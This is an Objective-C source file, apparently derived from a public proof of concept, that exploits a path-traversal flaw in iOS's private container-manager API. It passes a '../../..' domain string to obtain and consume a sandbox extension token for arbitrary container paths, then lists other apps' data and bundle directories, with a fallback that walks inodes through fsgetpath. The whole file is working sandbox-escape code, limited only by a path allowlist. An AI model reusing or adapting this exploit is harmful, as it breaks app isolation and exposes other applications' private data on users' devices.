// Modified for bounded, read-only 3012 container discovery on 2026-08-18.
// Derived from 3105 bad_query.c, GPL-3.0, commit
// 90ab4dd35823d58de10e6b8b78236e0e7e1ad32b.

#import "PathAccessBridge.h"

#import <dlfcn.h>
#import <errno.h>
#import <sys/stat.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>
#import <limits.h>
#import <xpc/xpc.h>

typedef void *(*PAQueryCreate)(void);
typedef void (*PAQuerySetU64)(void *, uint64_t);
typedef void (*PAQuerySetXPC)(void *, xpc_object_t);
typedef void (*PAQuerySetDomain)(void *, const char *);
typedef void *(*PAQueryGetSingle)(void *);
typedef void (*PAQueryFree)(void *);
typedef char *(*PACopyToken)(void *);
typedef int64_t (*PAConsumeToken)(const char *);
typedef int (*PAReleaseToken)(int64_t);

static BOOL PA3012AllowedPath(NSString *path) {
    if (![path isAbsolutePath]) return NO;
    NSString *standard = path.stringByStandardizingPath;
    NSArray<NSString *> *roots = @[
        @"/var/mobile/Containers/Data/Application",
        @"/private/var/mobile/Containers/Data/Application",
        @"/var/containers/Bundle/Application",
        @"/private/var/containers/Bundle/Application",
        @"/var/mobile/Containers/Data/System",
        @"/private/var/mobile/Containers/Data/System"
    ];
    for (NSString *root in roots) {
        if ([standard isEqualToString:root] ||
            [standard hasPrefix:[root stringByAppendingString:@"/"]]) return YES;
    }
    return NO;
}

int64_t PA3012GrantPath(NSString *path) {
    if (!PA3012AllowedPath(path)) return -255;
    void *manager = dlopen(
        "/usr/lib/system/libsystem_containermanager.dylib",
        RTLD_NOW | RTLD_LOCAL
    );
    if (!manager) return -1;
#define LOAD(type, name) ((type)dlsym(manager, name))
    PAQueryCreate queryCreate = LOAD(PAQueryCreate, "container_query_create");
    PAQuerySetU64 setClass = LOAD(PAQuerySetU64, "container_query_set_class");
    PAQuerySetXPC setGroups = LOAD(PAQuerySetXPC, "container_query_set_group_identifiers");
    PAQuerySetU64 setFlags = LOAD(PAQuerySetU64, "container_query_operation_set_flags");
    PAQuerySetU64 setPart = LOAD(PAQuerySetU64, "container_query_operation_set_part");
    PAQuerySetDomain setDomain = LOAD(PAQuerySetDomain, "container_query_operation_set_part_domain");
    PAQueryGetSingle getSingle = LOAD(PAQueryGetSingle, "container_query_get_single_result");
    PAQueryFree queryFree = LOAD(PAQueryFree, "container_query_free");
    PACopyToken copyToken = LOAD(PACopyToken, "container_copy_sandbox_token");
    PAConsumeToken consume = (PAConsumeToken)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
#undef LOAD
    if (!queryCreate || !setClass || !setGroups || !setFlags || !setPart ||
        !setDomain || !getSingle || !queryFree || !copyToken || !consume) {
        dlclose(manager);
        return -2;
    }
    void *query = queryCreate();
    if (!query) { dlclose(manager); return -3; }
    setClass(query, 13);
    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    setGroups(query, identifier);
    setPart(query, 3);
    NSString *domain = [@"../../../../../../../.." stringByAppendingString:path];
    setDomain(query, domain.fileSystemRepresentation);
    setFlags(query, 0x0000008000000000ULL);
    void *object = getSingle(query);
    char *token = object ? copyToken(object) : NULL;
    int64_t handle = token ? consume(token) : -4;
    if (token) free(token);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    queryFree(query);
    dlclose(manager);
    return handle;
}

void PA3012ReleaseGrant(int64_t handle) {
    if (handle < 0) return;
    PAReleaseToken release = (PAReleaseToken)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release) release(handle);
}

NSArray<NSString *> *PA3012DirectoryNames(
    NSString *path,
    NSUInteger limit,
    int64_t *retainedHandle,
    NSString **error
) {
    int64_t handle = PA3012GrantPath(path);
    if (handle < 0) {
        if (error) *error = [NSString stringWithFormat:@"path grant failed code=%lld", handle];
        return @[];
    }
    NSError *fileError = nil;
    NSArray<NSString *> *names = [NSFileManager.defaultManager
        contentsOfDirectoryAtPath:path error:&fileError];
    if (!names) {
        PA3012ReleaseGrant(handle);
        if (error) *error = [NSString stringWithFormat:@"directory read failed: %@",
            fileError.localizedDescription ?: @"unknown"];
        return @[];
    }
    if (retainedHandle) *retainedHandle = handle;
    else PA3012ReleaseGrant(handle);
    return names.count > limit ? [names subarrayWithRange:NSMakeRange(0, limit)] : names;
}

NSArray<NSString *> *PA3012DirectoryNamesByInode(
    NSString *path,
    uint64_t maximumInode,
    NSUInteger limit,
    NSString **error
) {
    if (!PA3012AllowedPath(path) || maximumInode == 0 || limit == 0) {
        if (error) *error = @"inode fallback received invalid bounds or path";
        return @[];
    }
    NSString *canonicalRoot = path.stringByStandardizingPath;
    if ([canonicalRoot hasPrefix:@"/private/var/"]) {
        canonicalRoot = [canonicalRoot substringFromIndex:@"/private".length];
    }
    struct statfs filesystem;
    if (statfs(path.fileSystemRepresentation, &filesystem) != 0) {
        if (error) {
            *error = [NSString stringWithFormat:@"inode statfs failed errno=%d", errno];
        }
        return @[];
    }

    NSMutableOrderedSet<NSString *> *names = [NSMutableOrderedSet orderedSet];
    char buffer[PATH_MAX];
    for (uint64_t inode = 1; inode <= maximumInode && names.count < limit; inode++) {
        ssize_t length = fsgetpath(buffer, sizeof(buffer), &filesystem.f_fsid, inode);
        if (length <= 0) continue;
        NSString *candidate = [NSString stringWithUTF8String:buffer];
        if ([candidate hasPrefix:@"/private/var/"]) {
            candidate = [candidate substringFromIndex:@"/private".length];
        }
        NSString *prefix = [canonicalRoot stringByAppendingString:@"/"];
        if (![candidate hasPrefix:prefix]) continue;
        NSString *relative = [candidate substringFromIndex:prefix.length];
        if (relative.length == 0 || [relative containsString:@"/"]) continue;
        if ([NSUUID.alloc initWithUUIDString:relative]) [names addObject:relative];
    }
    if (names.count == 0 && error) {
        *error = [NSString stringWithFormat:
            @"inode fallback found no direct child through inode=%llu",
            (unsigned long long)maximumInode];
    }
    return names.array;
}
